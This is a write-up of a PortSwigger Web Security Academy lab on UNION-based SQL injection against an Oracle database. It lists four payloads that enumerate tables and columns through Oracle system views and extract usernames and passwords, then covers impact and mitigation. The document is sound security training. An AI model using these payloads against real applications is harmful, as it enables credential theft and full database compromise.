## SQL Injection Attack – Listing the Database Contents on Oracle Databases

Platform: PortSwigger Web Security Academy  
Lab: SQL injection attack, listing the database contents on Oracle databases

---

## Vulnerability Type
UNION-based SQL Injection

---

## Description
The application is vulnerable to SQL injection, allowing an attacker to use the UNION operator to interact with the backend Oracle database. Due to Oracle-specific behavior, a dummy table is required to perform SELECT statements without referencing a real table.

---

## Payloads Used

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

```sql
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--
```

```sql
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXXXX'--
```

```sql
'+UNION+SELECT+USERNAME_XXXXXX,+PASSWORD_XXXXXX+FROM+USERS_XXXXXX--
```

---

## Technical Impact
By querying Oracle system tables, it was possible to enumerate all tables and columns in the database. This allowed identification of the users table and extraction of valid credentials, resulting in full compromise of application authentication.

---

## Risk
An attacker could enumerate the entire database structure and extract sensitive data, leading to account takeover, data breaches, and potential system compromise.

---

## Mitigation
Use prepared statements and parameterized queries to prevent SQL injection. Avoid dynamic SQL construction and implement strict input validation.
